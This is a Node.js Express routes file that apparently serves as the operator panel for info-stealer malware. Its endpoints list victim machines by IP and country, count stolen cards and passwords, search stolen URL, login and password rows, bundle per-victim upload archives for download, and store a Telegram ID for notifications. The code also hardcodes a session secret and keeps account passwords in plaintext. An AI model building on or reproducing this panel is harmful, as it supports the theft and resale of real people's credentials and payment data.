var express = require("express");
var session = require("express-session");
const AdmZip = require('adm-zip');
const stat = require('fs').statSync;
var path = require("path");
var fs = require("fs");

const zip = new AdmZip();

module.exports = function (app, db) {
	app.use(express.static(__dirname + '/static'));

	express.static.mime.define({
		'application/javascript': ['js']
	});

	app.engine('ejs', require('ejs-locals'));
	app.set('views', __dirname + '/views');
	app.set('view engine', 'ejs');

	app.set('trust proxy', 1)

	app.use(session({
		secret: "aedf8h3289d3789d8n9da",
		resave: false,
		saveUninitialized: true,
		cookie: {
			maxAge: 60 * 60 * 24 * 365 * 1000,
		}
	}))

	app.get("/", async(req, res) => {
		if (req.session.login) {
			res.redirect("/login");
		} else {
			res.render("index");
		}
	});

	app.get("/clients", async(req, res) => {
		if (req.session.login) {
			res.render("clients");
		} else {
			res.redirect("/login");
		}
	});

	app.get("/login", async(req, res) => {
		if (req.query.logout !== undefined) {
			req.session.destroy();
			return res.redirect("/");
		}

		if (!req.session.login)
			res.render("login");
		else
			res.redirect("/clients");
	});

	app.get("/passwords", async(req, res) => {
		if (req.session.login)
			res.render("passwords", {
				login: req.session.login
			});
		else
			res.redirect("/login");
	});

	app.get("/settings", async(req, res) => {
		if (req.session.login)
			res.render("settings");
		else
			res.redirect("/login");
	});

	setInterval(function () {
		for (var type in zip_download_limit) {
			for (var i in zip_download_limit[type]) {
				if (zip_download_limit[type][i] < Math.floor(new Date().getTime() / 1000))
					delete zip_download_limit[type][i];
			}
		}
	}, 60 * 1)

	var zip_download_limit = {}

	app.get("/zip/package/clients", async(req, res) => {
		if (!req.session.uid) return res.end("Please auth");

		if (req.query.type in zip_download_limit && zip_download_limit[req.query.type][req.session.uid]) return res.end("limit syka");

		if (req.query.type == "checked") {
			var ips = await db.promiseSelect("SELECT * FROM data_owners WHERE owner_id = ? AND checked = 1", [req.session.uid]);
		} else if (req.query.type == "unchecked") {
			var ips = await db.promiseSelect("SELECT * FROM data_owners WHERE owner_id = ? AND checked = 0", [req.session.uid]);
		} else if (req.query.type == "empty") {
			var ips = await db.promiseSelect("SELECT * FROM data_owners WHERE owner_id = ? AND checked = 2", [req.session.uid]);
		} else return res.end("Not type");

		if (!ips.length) return res.end("not data");

		const zip = new AdmZip();

		ips.map(row => {
			const p = stat(path.join(__dirname, '../uploads') + '/' + row.ip + '.zip');
			if (p.isFile()) {
				zip.addLocalFile(path.join(__dirname, '../uploads') + '/' + row.ip + '.zip');
			}
		});

		var zipname = (req.query.type == "checked" ? "checked" : "unchecked.zip") + "-" + req.session.uid + "-" + Math.random().toString(36) + ".zip";

		zip.writeZip(zipname);

		res.setHeader("Content-Type", "application/zip");

		var file = new fs.ReadStream(zipname);
		file.pipe(res);

		file.on('end', () => {
			fs.unlink(zipname, () => {});
		});

		if (!(req.query.type in zip_download_limit)) zip_download_limit[req.query.type] = {};

		zip_download_limit[req.query.type][req.session.uid] = Math.floor(new Date().getTime() / 1000) + 60 * 1;

	})

	app.post("/ajax/login", async(req, res, next) => {
		var check = await db.promiseSelect("SELECT * FROM accounts WHERE login = ? AND password = ?", [req.body.login, req.body.password]);

		if (check.length) {
			req.session.uid = check[0].id;
			req.session.login = check[0].login;

			res.json({
				status: true
			});
		} else res.json({
			status: false,
			msg: "Login or password not found"
		})
	});

	app.post("/ajax/load.full_info", async(req, res, next) => {
		if (!req.session.uid) return res.json({
			status: false,
			msg: "Please auth"
		});

		var info = await db.promiseSelect("SELECT SUM(count_cards) cards, SUM(count_passwords) passwords, COUNT(*) clients FROM data_owners WHERE owner_id = ?", [req.session.uid]);
		var countrys = await db.promiseSelect("SELECT country, COUNT(*) count FROM data_owners WHERE owner_id = ? GROUP BY country ORDER BY count DESC LIMIT 5", [req.session.uid]);
		var checkeds = await db.promiseSelect("SELECT COUNT(*) count FROM data_owners WHERE owner_id = ? AND checked = 1", [req.session.uid]);
		var uncheckeds = await db.promiseSelect("SELECT COUNT(*) count FROM data_owners WHERE owner_id = ? AND checked = 0", [req.session.uid]);
		var emptys = await db.promiseSelect("SELECT COUNT(*) count FROM data_owners WHERE owner_id = ? AND checked = 2", [req.session.uid]);

		res.json({
			status: true,
			info: info[0],
			countrys: countrys,
			clientStatus: {
				checked: checkeds[0].count,
				unchecked: uncheckeds[0].count,
				empty: emptys[0].count,
			},
		})
	})

	app.post("/ajax/load.presents", async(req, res, next) => {
		if (!req.session.uid) return res.json({
			status: false,
			msg: "Please auth"
		});

		var user = await db.promiseSelect("SELECT * FROM accounts WHERE id = ?", [req.session.uid]);
		if (!user.length) return res.json({
			status: false,
			msg: "User not found"
		});

		if (req.body.type == "add") {
			if (req.body.params.domain.match(/^([a-z0-9\-\.]+).?:?([a-z0-9]{1,8})$/) == null) return res.json({
				status: false,
				msg: "Please correct: google.com"
			});

			req.body.params.category = parseInt(req.body.params.category);

			if (isNaN(req.body.params.category) || req.body.params.category < 1 || req.body.params.category > 7) return res.json({
				status: false,
				msg: "Bad category"
			});

			var check = await db.promiseSelect("SELECT * FROM accounts_presents WHERE user_id = ? AND category = ? AND domain = ?", [req.session.uid, req.body.params.category, req.body.params.domain]);
			if (check.length) return res.json({
				status: false,
				msg: "Error you are already using this domain"
			});

			db.run("INSERT INTO accounts_presents (user_id, category, domain) VALUES (?, ?, ?)", [
				user[0].id,
				req.body.params.category,
				req.body.params.domain,
			]);

			res.json({
				status: true,
				msg: "Presents successfully added"
			});
		} else if (req.body.type == "load") {
			var page = req.body.page || 0;

			if (req.body.query) {
				var rows = await db.promiseSelect("SELECT * FROM accounts_presents WHERE user_id = ? AND domain LIKE ? LIMIT 15 OFFSET ?", [req.session.uid, req.body.query + "%", 15 * page]);
			} else {
				var rows = await db.promiseSelect("SELECT * FROM accounts_presents WHERE user_id = ? LIMIT 15 OFFSET ?", [req.session.uid, 15 * page]);
			}

			res.json({
				status: true,
				response: rows,
				page: page
			})
		} else if (req.body.type == "delete") {
			var check = await db.promiseSelect("SELECT * FROM accounts_presents WHERE user_id = ? AND id = ?", [req.session.uid, req.body.id]);
			if (check.length) return res.json({
				status: false,
				msg: "Not found"
			});

			db.run("DELETE FROM accounts_presents WHERE user_id = ? AND id = ?", [
				req.session.uid, req.body.params.id
			]);

			res.json({
				status: true,
				msg: "Presents successfully remove"
			});
		} else res.json({
			status: false,
			msg: "Not type"
		});
	})
	app.post("/ajax/load.clients", async(req, res, next) => {
		if (!req.session.uid) return res.json({
			status: false,
			msg: "Please auth"
		});

		var page = req.body.page || 0;

		// todo fix
		if (req.body.query) {
			var clients = await db.promiseSelect("SELECT * FROM data_owners WHERE owner_id = ? AND ip LIKE ? ORDER BY time DESC LIMIT 25 OFFSET ?", [req.session.uid, req.body.query + "%", 25 * page]);
		} else {
			var clients = await db.promiseSelect("SELECT * FROM data_owners WHERE owner_id = ? ORDER BY time DESC LIMIT 25 OFFSET ?", [req.session.uid, 25 * page]);
		}
		res.json({
			status: true,
			response: clients,
			page: page
		})
	});

	app.post("/ajax/load.passwords", async(req, res, next) => {
		if (!req.session.uid) return res.json({
			status: false,
			msg: "Please auth"
		});

		var page = req.body.page || 0;

		if (req.body.query) {
			var clients = await db.promiseSelect("SELECT * FROM data_rows WHERE owner_id = ? AND (url LIKE ? OR login LIKE ? OR password LIKE ?) LIMIT 25 OFFSET ?", [
				req.session.uid,
				"%" + req.body.query + "%",
				"%" + req.body.query + "%",
				"%" + req.body.query + "%",
				25 * page
			]);
		} else {
			var clients = await db.promiseSelect("SELECT * FROM data_rows WHERE owner_id = ? ORDER BY id DESC LIMIT 25 OFFSET ?", [req.session.uid, 25 * page]);
		}
		res.json({
			status: true,
			response: clients,
			page: page
		})
	});

	app.post("/ajax/load.client.info", async(req, res, next) => {
		if (!req.session.uid) return res.json({
			status: false,
			msg: "Please auth"
		});

		var page = req.body.page || 0;

		if (['ip', ].indexOf(req.body.type) == -1) return res.json({
			status: false,
			msg: "Type disabled"
		});

		var user = await db.promiseSelect("SELECT * FROM data_owners WHERE owner_id = ? AND " + req.body.type + " = ?", [req.session.uid, req.body.param]);
		if (!user.length) res.json({
			status: true,
			response: []
		})

		if (req.body.query) {
			var clients = await db.promiseSelect("SELECT * FROM data_rows WHERE data_id = ? AND (url LIKE ? OR login LIKE ? OR password LIKE ?) LIMIT 100 OFFSET ?", [
				user[0].id,
				"%" + req.body.query + "%",
				"%" + req.body.query + "%",
				"%" + req.body.query + "%",
				100 * page
			]);
		} else {
			var clients = await db.promiseSelect("SELECT * FROM data_rows WHERE data_id = ? LIMIT 100 OFFSET ?", [user[0].id, 100 * page]);
		}

		res.json({
			status: true,
			response: clients,
			page: page
		})
	});

app.post("/ajax/client", async (req, res, next) => {
    if (!req.session.uid) return res.json({
        status: false,
        msg: "Please auth"
    });

    var check = await db.promiseSelect("SELECT * FROM accounts WHERE id = ?", [req.session.uid]);
    if (!check.length) return res.json({
        status: false,
        msg: "User not found"
    });

    if (req.body.type == "settings") {
        if (req.body.params.password) {
            if (req.body.params.password.match(/[a-zA-Z0-9\_ \.,-=]{6,16}/) == null) return res.json({
                status: false,
                msg: "Password error 6-16 characters"
            });

            db.run("UPDATE accounts SET password = ? WHERE id = ?", [req.body.params.password, check[0].id]);
        }

        if (req.body.params.telegram) {
            req.body.params.telegram = parseInt(req.body.params.telegram);
            if (isNaN(req.body.params.telegram)) return res.json({
                status: false,
                msg: "Telegram ID error"
            });
            if (String(req.body.params.telegram).length > 20) return res.json({
                status: false,
                msg: "Telegram Error ID"
            });
            db.run("UPDATE accounts SET telegram_id = ? WHERE id = ?", [req.body.params.telegram, check[0].id]);
        }

        res.json({
            status: true,
            msg: "Success"
        });
    } else if (req.body.type == "delete") {
        var rows = await db.promiseSelect("SELECT * FROM data_owners WHERE id = ? AND owner_id = ?", [req.body.params.id, req.session.uid]);
        if (!rows.length) return res.json({
            status: false,
            msg: "Not found"
        });

        db.run("DELETE FROM data_owners WHERE id = ?", [rows[0].id]);
        db.run("DELETE FROM data_rows WHERE data_id = ?", [rows[0].id]);

        res.json({
            status: true,
            msg: "Deleted"
        });
    } else if (req.body.type == "checked") {
        var row = await db.promiseSelect("SELECT * FROM data_owners WHERE id = ? AND owner_id = ?", [req.body.params.id, req.session.uid]);
        if (!row.length) return res.json({
            status: false,
            msg: "Not found"
        });

        console.log(row)

        db.run("UPDATE data_owners SET checked = ? WHERE id = ?", [!row[0].checked, row[0].id]);

        res.json({
            status: true,
            checked: !row[0].checked
        });
    } else res.json({
        status: false,
        msg: "Not type"
    });
})
}

async function promiseReuqest(params, callback) {
	return new Promise((res, rej) => {
		request(params, function (err, response, body) {
			if (err) reject(err)
			else res(body);
		})
	});
}